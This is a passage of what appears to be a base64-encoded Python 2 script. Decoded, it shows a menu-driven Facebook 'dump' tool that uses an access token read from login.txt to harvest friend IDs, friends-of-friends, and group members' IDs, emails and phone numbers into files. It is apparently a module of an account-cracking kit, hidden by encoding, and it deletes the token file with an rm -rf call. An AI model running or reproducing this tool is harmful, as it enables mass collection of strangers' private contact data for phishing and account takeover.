vinrldIFwwMzNbMTs5Mm1TY2hvb2xcMDMzWzE7OTdtICAgICAgICA6ICcKCQkJCWZvciBxIGluIHpbJ2VkdWNhdGlvbiddOgoJCQkJCXRyeToKCQkJCQkJcHJpbnQgJ1wwMzNbMTs5MW0gICAgICAgICAgICAgICAgICAgfiBcMDMzWzE7OTdtJytxWydzY2hvb2wnXVsnbmFtZSddCgkJCQkJZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbSAgICAgICAgICAgICAgICAgICB+IFwwMzNbMTs5MW1Ob3QgZm91bmQnCgkJCWV4Y2VwdCBLZXlFcnJvcjogcGFzcwoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQltZW51KCkKCQllbHNlOgoJCQlwYXNzCgllbHNlOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBVc2VyIG5vdCBmb3VuZCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnUoKQoKIyMjIyMgRFVNUCAjIyMjIwpkZWYgZHVtcCgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBHZXQgSUQgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gR2V0IElEIGZyaWVuZCBmcm9tIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEdldCBncm91cCBtZW1iZXIgSUQiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuXDAzM1sxOzk3bSBHZXQgZ3JvdXAgbWVtYmVyIGVtYWlsIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gR2V0IGdyb3VwIG1lbWJlciBwaG9uZSBudW1iZXIiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTYuXDAzM1sxOzk3bSBHZXQgZW1haWwgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm03LlwwMzNbMTs5N20gR2V0IGVtYWlsIGZyaWVuZCBmcm9tIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtOC5cMDMzWzE7OTdtIEdldCBhIGZyaWVuZCdzIHBob25lIG51bWJlciIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtOS5cMDMzWzE7OTdtIEdldCBhIGZyaWVuZCdzIHBob25lIG51bWJlciBmcm9tIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCglwcmludCAi4pWRIgoJY2hvb3NlX2R1bXAoKQojLS0tLS1jaG9pY2VzCmRlZiBjaG9vc2VfZHVtcCgpOgoJY2hvb3NlX2Zyb20gPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtPj4+IFwwMzNbMTs5N20iKQoJaWYgY2hvb3NlX2Zyb20gPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQljaG9vc2VfZHVtcCgpCgllbGlmIGNob29zZV9mcm9tID09IjEiOgoJCWZyaWVuZHNfaWQoKQoJZWxpZiBjaG9vc2VfZnJvbSA9PSIyIjoKCQlpZF9mcm9tX2ZyaWVuZHMoKQoJZWxpZiBjaG9vc2VfZnJvbSA9PSIzIjoKCQlpZF9tZW1iZXJfZ3JvdXAoKQoJZWxpZiBjaG9vc2VfZnJvbSA9PSI0IjoKCQllbV9tZW1iZXJfZ3JvdXAoKQoJZWxpZiBjaG9vc2VfZnJvbSA9PSI1IjoKCQlub19tZW1iZXJfZ3JvdXAoKQoJZWxpZiBjaG9vc2VfZnJvbSA9PSI2IjoKCQllbWFpbCgpCgllbGlmIGNob29zZV9mcm9tID09IjciOgoJCWVtYWlsX2Zyb21fZnJpZW5kcygpCgllbGlmIGNob29zZV9mcm9tID09IjgiOgoJCXBob25lX251bWJlcigpCgllbGlmIGNob29zZV9mcm9tID09IjkiOgoJCXBob25lX251bWJlcl9mcm9tX2ZyaWVuZHMoKQoJZWxpZiBjaG9vc2VfZnJvbSA9PSIwIjoKCQltZW51KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJY2hvb3NlX2R1bXAoKQoKIyMjIyMgSUQgZnJpZW5kcyAjIyMjIwpkZWYgZnJpZW5kc19pZCgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlyPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikKCQl6PWpzb24ubG9hZHMoci50ZXh0KQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIGlkIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L2ZyaWVuZHNfaWQudHh0JywndycpCgkJZm9yIGEgaW4gelsnZGF0YSddOgoJCQlpZGZyaWVuZHMuYXBwZW5kKGFbJ2lkJ10pCgkJCW1ha2VfYWN0aW9uLndyaXRlKGFbJ2lkJ10gKyAnXG4nKQoJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZGZyaWVuZHMpKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK2FbJ2lkJ10pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJwoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGlkZnJpZW5kcykpCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQoJCW9zLnJlbmFtZSgnb3V0L2ZyaWVuZHNfaWQudHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJZXhpdCgpCgojIyMjIyBJRCBGUk9NIEZSSUVORFMgIyMjIyMKZGVmIGlkX2Zyb21fZnJpZW5kcygpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCQl0cnk6CgkJCXNlYXQgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJCW9wID0ganNvbi5sb2FkcyhzZWF0LnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJcj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/ZmllbGRzPWZyaWVuZHMubGltaXQoNTAwMDApJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCXo9anNvbi5sb2FkcyhyLnRleHQpCgkJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgaWQgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJbWFrZV9hY3Rpb24gPSBvcGVuKCdvdXQvZnJpZW5kc19pZF9mcm9tX2ZyaWVuZHMudHh0JywndycpCgkJZm9yIGEgaW4gelsnZnJpZW5kcyddWydkYXRhJ106CgkJCWlkZnJvbWZyaWVuZHMuYXBwZW5kKGFbJ2lkJ10pCgkJCW1ha2VfYWN0aW9uLndyaXRlKGFbJ2lkJ10gKyAnXG4nKQoJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZGZyb21mcmllbmRzKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIithWydpZCddKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCW1ha2VfYWN0aW9uLmNsb3NlKCkKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBpZCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIElEIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihpZGZyb21mcmllbmRzKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvZnJpZW5kc19pZF9mcm9tX2ZyaWVuZHMudHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJZXhpdCgpCgojIyMjIyBJRCBGUk9NIEdST1VQIE1FTUJFUiAjIyMjIwpkZWYgaWRfbWVtYmVyX2dyb3VwKCk6Cgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlpZD1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJCXRyeToKCQkJcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nK2lkKycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQlkdW1wKCkKCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgZ3JvdXAgbWVtYmVyIGlkIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L21lbWJlcl9ncm91cC50eHQnLCd3JykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgYSBpbiBzWydkYXRhJ106CgkJCW1lbWJlcl9pZC5hcHBlbmQoYVsnaWQnXSkKCQkJbWFrZV9hY3Rpb24ud3JpdGUoYVsnaWQnXSArICdcbicpCgkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKG1lbWJlcl9pZCkpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrYVsnaWQnXSksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQltYWtlX2FjdGlvbi5jbG9zZSgpCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgaWQgXDAzM1sxOzk3bS4uLi4nCgkJcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4obWVtYmVyX2lkKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvbWVtYmVyX2dyb3VwLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWV4aXQoKQoKIyMjIyMgRU1BSUwgRlJPTSBncm91cCAjIyMjIwpkZWYgZW1fbWVtYmVyX2dyb3VwKCk6Cgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlpZD1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJCXRyeToKCQkJcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nK2lkKycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQlkdW1wKCkKCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgZ3JvdXAgbWVtYmVyIGVtYWlsIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L2VtX21lbWJlcl9ncm91cC50eHQnLCd3JykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgYSBpbiBzWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrYVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCWVtbWVtLmFwcGVuZCh6WydlbWFpbCddKQoJCQkJbWFrZV9hY3Rpb24ud3JpdGUoelsnZW1haWwnXSArICdcbicpCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbW1lbSkpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnZW1haWwnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQkJZXhjZXB0IEtleUVycm9yOgoJCQkJcGFzcwoJCW1ha2VfYWN0aW9uLmNsb3NlKCkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBlbWFpbCBmcm9tIG1lbWJlciBncm91cCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIEVtYWlsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihlbW1lbSkpCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQoJCW9zLnJlbmFtZSgnb3V0L2VtX21lbWJlcl9ncm91cC50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlleGl0KCkKCiMjIyMjIFBIT05FIE5VTUJFUiBGUk9NIEdST1VQICMjIyMjCmRlZiBub19tZW1iZXJfZ3JvdXAoKToKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQgbG9nbwoJCWlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCgkJdHJ5OgoJCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWQrJyZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCQkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCWR1bXAoKQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBncm91cCBtZW1iZXIgcGhvbmUgbnVtYmVyIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgo